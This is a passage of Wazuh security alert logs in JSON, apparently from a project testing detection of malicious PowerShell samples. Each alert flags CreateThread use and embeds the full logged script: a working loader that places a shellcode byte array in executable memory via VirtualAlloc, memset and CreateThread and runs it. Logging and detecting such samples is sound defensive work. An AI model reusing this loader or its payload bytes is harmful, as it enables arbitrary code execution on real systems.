,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"0e5fb504-66df-4bf7-9f01-bbe7b73afc8e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1730.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:10.302+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":44,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015650.698308","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:39.9075535Z","eventRecordID":"200996","processID":"10808","threadID":"5124","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$leF = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $leF -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc7,0xd9,0x74,0x24,0xf4,0xb8,0xe7,0xf4,0x07,0x55,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xea,0xfc,0x03,0x42,0xf3,0x16,0xf2,0xa9,0x13,0x54,0xfd,0x51,0xe3,0x39,0x77,0xb4,0xd2,0x79,0xe3,0xbc,0x44,0x4a,0x67,0x90,0x68,0x21,0x25,0x01,0xfb,0x47,0xe2,0x26,0x4c,0xed,0xd4,0x09,0x4d,0x5e,0x24,0x0b,0xcd,0x9d,0x79,0xeb,0xec,0x6d,0x8c,0xea,0x29,0x93,0x7d,0xbe,0xe2,0xdf,0xd0,0x2f,0x87,0xaa,0xe8,0xc4,0xdb,0x3b,0x69,0x38,0xab,0x3a,0x58,0xef,0xa0,0x64,0x7a,0x11,0x65,0x1d,0x33,0x09,0x6a,0x18,0x8d,0xa2,0x58,0xd6,0x0c,0x63,0x91,0x17,0xa2,0x4a,0x1e,0xea,0xba,0x8b,0x98,0x15,0xc9,0xe5,0xdb,0xa8,0xca,0x31,0xa6,0x76,0x5e,0xa2,0x00,0xfc,0xf8,0x0e,0xb1,0xd1,0x9f,0xc5,0xbd,0x9e,0xd4,0x82,0xa1,0x21,0x38,0xb9,0xdd,0xaa,0xbf,0x6e,0x54,0xe8,0x9b,0xaa,0x3d,0xaa,0x82,0xeb,0x9b,0x1d,0xba,0xec,0x44,0xc1,0x1e,0x66,0x68,0x16,0x13,0x25,0xe4,0xdb,0x1e,0xd6,0xf4,0x73,0x28,0xa5,0xc6,0xdc,0x82,0x21,0x6a,0x94,0x0c,0xb5,0x8d,0x8f,0xe9,0x29,0x70,0x30,0x0a,0x63,0xb6,0x64,0x5a,0x1b,0x1f,0x05,0x31,0xdb,0xa0,0xd0,0xac,0xde,0x36,0x1b,0x98,0xe0,0xc4,0xf3,0xdb,0xe2,0xca,0x99,0x55,0x04,0x9a,0xcd,0x35,0x99,0x5a,0xbe,0xf5,0x49,0x32,0xd4,0xf9,0xb6,0x22,0xd7,0xd3,0xde,0xc8,0x38,0x8a,0xb7,0x64,0xa0,0x97,0x4c,0x15,0x2d,0x02,0x29,0x15,0xa5,0xa1,0xcd,0xdb,0x4e,0xcf,0xdd,0x8b,0xbe,0x9a,0xbc,0x1d,0xc0,0x30,0xaa,0xa1,0x54,0xbf,0x7d,0xf6,0xc0,0xbd,0x58,0x30,0x4f,0x3d,0x8f,0x4b,0x46,0xab,0x70,0x23,0xa7,0x3b,0x71,0xb3,0xf1,0x51,0x71,0xdb,0xa5,0x01,0x22,0xfe,0xa9,0x9f,0x56,0x53,0x3c,0x20,0x0f,0x00,0x97,0x48,0xad,0x7f,0xdf,0xd6,0x4e,0xaa,0xe1,0x2b,0x99,0x92,0x97,0x45,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$FcHI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($FcHI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$FcHI,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 8534fe19-f85f-4c16-8730-1d4255d1b6c4\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1754.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$leF = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $leF -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc7,0xd9,0x74,0x24,0xf4,0xb8,0xe7,0xf4,0x07,0x55,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xea,0xfc,0x03,0x42,0xf3,0x16,0xf2,0xa9,0x13,0x54,0xfd,0x51,0xe3,0x39,0x77,0xb4,0xd2,0x79,0xe3,0xbc,0x44,0x4a,0x67,0x90,0x68,0x21,0x25,0x01,0xfb,0x47,0xe2,0x26,0x4c,0xed,0xd4,0x09,0x4d,0x5e,0x24,0x0b,0xcd,0x9d,0x79,0xeb,0xec,0x6d,0x8c,0xea,0x29,0x93,0x7d,0xbe,0xe2,0xdf,0xd0,0x2f,0x87,0xaa,0xe8,0xc4,0xdb,0x3b,0x69,0x38,0xab,0x3a,0x58,0xef,0xa0,0x64,0x7a,0x11,0x65,0x1d,0x33,0x09,0x6a,0x18,0x8d,0xa2,0x58,0xd6,0x0c,0x63,0x91,0x17,0xa2,0x4a,0x1e,0xea,0xba,0x8b,0x98,0x15,0xc9,0xe5,0xdb,0xa8,0xca,0x31,0xa6,0x76,0x5e,0xa2,0x00,0xfc,0xf8,0x0e,0xb1,0xd1,0x9f,0xc5,0xbd,0x9e,0xd4,0x82,0xa1,0x21,0x38,0xb9,0xdd,0xaa,0xbf,0x6e,0x54,0xe8,0x9b,0xaa,0x3d,0xaa,0x82,0xeb,0x9b,0x1d,0xba,0xec,0x44,0xc1,0x1e,0x66,0x68,0x16,0x13,0x25,0xe4,0xdb,0x1e,0xd6,0xf4,0x73,0x28,0xa5,0xc6,0xdc,0x82,0x21,0x6a,0x94,0x0c,0xb5,0x8d,0x8f,0xe9,0x29,0x70,0x30,0x0a,0x63,0xb6,0x64,0x5a,0x1b,0x1f,0x05,0x31,0xdb,0xa0,0xd0,0xac,0xde,0x36,0x1b,0x98,0xe0,0xc4,0xf3,0xdb,0xe2,0xca,0x99,0x55,0x04,0x9a,0xcd,0x35,0x99,0x5a,0xbe,0xf5,0x49,0x32,0xd4,0xf9,0xb6,0x22,0xd7,0xd3,0xde,0xc8,0x38,0x8a,0xb7,0x64,0xa0,0x97,0x4c,0x15,0x2d,0x02,0x29,0x15,0xa5,0xa1,0xcd,0xdb,0x4e,0xcf,0xdd,0x8b,0xbe,0x9a,0xbc,0x1d,0xc0,0x30,0xaa,0xa1,0x54,0xbf,0x7d,0xf6,0xc0,0xbd,0x58,0x30,0x4f,0x3d,0x8f,0x4b,0x46,0xab,0x70,0x23,0xa7,0x3b,0x71,0xb3,0xf1,0x51,0x71,0xdb,0xa5,0x01,0x22,0xfe,0xa9,0x9f,0x56,0x53,0x3c,0x20,0x0f,0x00,0x97,0x48,0xad,0x7f,0xdf,0xd6,0x4e,0xaa,0xe1,0x2b,0x99,0x92,0x97,0x45,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$FcHI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($FcHI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$FcHI,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"8534fe19-f85f-4c16-8730-1d4255d1b6c4","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1754.ps1"}}},"location":"EventChannel"}
